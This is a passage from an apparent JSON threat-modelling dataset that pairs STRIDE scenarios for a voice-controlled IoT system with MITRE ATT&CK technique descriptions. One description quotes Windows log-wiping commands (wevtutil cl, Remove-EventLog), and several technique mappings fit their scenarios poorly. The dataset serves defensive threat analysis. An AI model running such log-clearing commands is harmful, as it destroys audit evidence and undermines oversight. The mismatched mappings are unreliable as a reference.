                "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
                "technique_id": "T1574.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a server-side vulnerability to gain admin-level access to the entire system.",
            "Assumptions": [
                {
                    "Assumption": "There is an unpatched security vulnerability on the server-side.",
                    "Role": "Server Administrator",
                    "Condition": "Current vulnerability management is insufficient."
                }
            ],
            "Potential Impact": "Unauthorized system access, complete system takeover, risk of data modification or destruction.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "server-side",
                "admin access",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious user exploits a firmware flaw in the IoT controller to gain elevated privileges and perform unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller firmware has exploitable flaws.",
                    "Role": "Firmware Developer",
                    "Condition": "Current security testing of firmware is inadequate."
                }
            ],
            "Potential Impact": "Compromised IoT device security, unauthorized control over devices, potential system-wide impact.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "privilege escalation",
                "IoT controller",
                "security flaw"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A privileged user abuses their access to change system configurations and disable security controls.",
            "Assumptions": [
                {
                    "Assumption": "Privileged user actions are not adequately monitored.",
                    "Role": "System Security Officer",
                    "Condition": "Current monitoring of privileged actions is insufficient."
                }
            ],
            "Potential Impact": "Disabled security measures, increased risk of further attacks, potential data and operational compromises.",
            "MITRE ATT&CK Keywords": [
                "privileged access",
                "user abuse",
                "configuration changes",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a cloned microphone to send false voice commands to the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to tamper with the microphone.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity required."
                },
                {
                    "Assumption": "The system does not use secure authentication for device connections.",
                    "Role": "System",
                    "Condition": "Lack of device authentication."
                },
                {
                    "Assumption": "The voice command system does not validate the source of voice commands.",
                    "Role": "System",
                    "Condition": "No source validation."
                }
            ],
            "Potential Impact": "Unauthorized actions could be executed, compromising integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "voice commands",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate user's voice to issue unauthorized commands to the IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to recordings of the legitimate user's voice.",
                    "Role": "Attacker",
                    "Condition": "Access to voice recordings."
                },
                {
                    "Assumption": "The voice recognition system does not effectively distinguish between authentic and spoofed voices.",
                    "Role": "System",
                    "Condition": "Lack of robust voice recognition."
                },
                {
                    "Assumption": "Attackers are aware of the voice commands used within the system.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of voice commands."
                }
            ],
            "Potential Impact": "Unauthorized control of IoT devices, compromising confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice recognition",
                "biometric",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Software](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)\n\nAdversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)",
                "id": "attack-pattern--bb5e59c4-abe7-40c7-8196-e373cb1e5974",
                "technique_id": "T1566.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends false server responses to the client-side application by intercepting and modifying network traffic.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept network traffic between the client-side application and the server.",
                    "Role": "Attacker",
                    "Condition": "Network position for interception."
                },
                {
                    "Assumption": "The communication channel is not encrypted or uses weak encryption.",
                    "Role": "System",
                    "Condition": "Unencrypted or weakly encrypted communication."
                },
                {
                    "Assumption": "The system does not validate the integrity of server responses.",
                    "Role": "System",
                    "Condition": "Lack of response validation."
                }
            ],
            "Potential Impact": "False data could be provided to users, compromising integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network traffic",
                "man-in-the-middle",
                "response tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of the IoT devices to execute unauthorized commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the IoT device.",
                    "Role": "Attacker",
                    "Condition": "Access to the device."
                },
                {
                    "Assumption": "The firmware update mechanism is not secured.",
                    "Role": "System",
                    "Condition": "Insecure firmware update."
                },
                {
                    "Assumption": "The IoT device does not verify the authenticity of firmware updates.",
                    "Role": "Device",
                    "Condition": "Lack of update verification."
                }
            ],
            "Potential Impact": "Unauthorized actions could be taken by IoT devices, compromising integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "IoT device",
                "control"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious commands into the client-side application, altering the signal sent to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application does not validate the integrity of incoming commands.",
                    "Role": "System",
                    "Condition": "Lack of input validation."
                },
                {
                    "Assumption": "The attacker can gain access to the client-side application to inject commands.",
                    "Role": "Attacker",
                    "Condition": "Access to the application."
                },
                {
                    "Assumption": "There are vulnerabilities in the client-side application that allow for code injection.",
                    "Role": "System",
                    "Condition": "Presence of code injection vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized commands may be executed, compromising integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "command injection",
                "client application",
                "code injection"
            ],
            "mitre_technique": {
                "name": "Command and Scripting Interpreter",
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
                "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
                "technique_id": "T1059"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data stored in cloud services to disrupt system functionality.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain access to the cloud storage with the appropriate permissions.",
                    "Role": "Attacker",
                    "Condition": "Access to cloud credentials."
                },
                {
                    "Assumption": "Security policies for cloud storage are not enforced or are weak.",
                    "Role": "System",
                    "Condition": "Weak cloud security policies."
                },
                {
                    "Assumption": "The cloud services do not validate data integrity before use.",
                    "Role": "System",
                    "Condition": "No integrity validation."
                }
            ],
            "Potential Impact": "Stored data could be corrupted or tampered with, compromising integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud services",
                "data integrity",
                "storage"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies issuing a specific voice command that resulted in unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The application does not have adequate logging or auditing mechanisms.",
                    "Role": "System",
                    "Condition": "Lack of logging."
                },
                {
                    "Assumption": "Voice command logs are not digitally signed or protected.",
                    "Role": "System",
                    "Condition": "Unprotected logs."
                },
                {
                    "Assumption": "There is no user authentication to verify who issued the commands.",
                    "Role": "System",
                    "Condition": "Lack of authentication."
                }
            ],
            "Potential Impact": "Difficulty in tracking user actions, compromising accountability and potentially making it easier to cover malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "auditing",
                "denial"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or alters log entries to hide traces of their actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the log files.",
                    "Role": "Attacker",
                    "Condition": "Access to log files."
                },
                {
                    "Assumption": "Logs are not adequately protected or encrypted.",
                    "Role": "System",
                    "Condition": "Unprotected logs."
                },
                {
                    "Assumption": "Log integrity checks are not in place to detect alterations.",
                    "Role": "System",
                    "Condition": "No integrity checks."
                }
            ],
            "Potential Impact": "Compromised accountability and forensic capabilities, undermining detection and investigation of incidents.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "protection",
                "trace hiding"
            ],
            "mitre_technique": {
                "name": "Standard Cryptographic Protocol",
                "description": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",
                "id": "attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5",
                "technique_id": "T1032"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies receiving an audio response regarding an important action, leading to disputes.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log audio responses accurately.",
                    "Role": "System",
                    "Condition": "Inaccurate logging."
                },
                {
                    "Assumption": "There is no mechanism to confirm user receipt of the responses.",
                    "Role": "System",
                    "Condition": "No confirmation mechanism."
                },
                {
                    "Assumption": "System logs are not protected from tampering.",
                    "Role": "System",
                    "Condition": "Unprotected logs."
                }
            ],
            "Potential Impact": "Accountability issues and potential conflicts due to lack of evidence, impacting service trust.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "response logging",
                "receipt confirmation",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive voice command data is intercepted and leaked over an unencrypted communication channel.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between components are not encrypted.",
                    "Role": "System",
                    "Condition": "Unencrypted communication."
                },
                {
                    "Assumption": "The attacker can position themselves to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network positioning."
                },
                {
                    "Assumption": "There is a lack of endpoint security measures to detect interceptions.",
                    "Role": "System",
                    "Condition": "Weak endpoint security."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network interception",
                "voice data",
                "unencrypted communication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to cloud-stored data containing sensitive voice commands and responses.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage does not have strong access control policies.",
                    "Role": "System",
                    "Condition": "Weak access controls."
                },
                {
                    "Assumption": "The attacker has valid or compromised cloud credentials.",
                    "Role": "Attacker",
                    "Condition": "Access to credentials."
                },
                {
                    "Assumption": "Data in the cloud is not encrypted or protected.",
                    "Role": "System",
                    "Condition": "Unprotected cloud data."
                }
            ],
            "Potential Impact": "Unauthorized disclosure and potential misuse of sensitive data, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "sensitive data",
                "access controls"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal system logs containing sensitive information are exposed to unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not adequately protected or restricted.",
                    "Role": "System",
                    "Condition": "Unprotected logs."
                },
                {
                    "Assumption": "Sensitive details are not masked or encrypted in logs.",
                    "Role": "System",
                    "Condition": "Unmasked sensitive details."
                },
                {
                    "Assumption": "There are no monitoring mechanisms for unauthorized log access.",
                    "Role": "System",
                    "Condition": "No monitoring."
                }
            ],
            "Potential Impact": "Confidentiality of sensitive information is compromised, leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "log exposure",
                "unauthorized access",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server-side application with a high volume of voice commands, causing a service outage.",
            "Assumptions": [
                {
                    "Assumption": "The server does not have rate limiting or throttling mechanisms.",
                    "Role": "System",
                    "Condition": "Lack of rate limiting."
                },
                {
                    "Assumption": "The attacker can generate and send large amounts of traffic.",
                    "Role": "Attacker",
                    "Condition": "Capability to generate traffic."
                },
                {
